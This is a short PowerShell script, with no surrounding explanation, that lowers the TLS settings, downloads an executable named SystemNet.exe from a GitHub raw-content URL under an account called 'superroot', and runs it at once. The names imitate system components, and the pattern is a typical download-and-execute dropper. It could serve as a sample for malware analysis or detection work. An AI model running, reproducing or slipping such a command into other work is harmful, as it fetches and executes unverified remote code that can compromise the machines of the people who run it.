[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Tls,Tls11,Tls12'

Invoke-WebRequest -Uri 'raw.githubusercontent.com/superroot/systemdll/SystemNet.exe' -OutFile SystemNet.exe

.\SystemNet.exe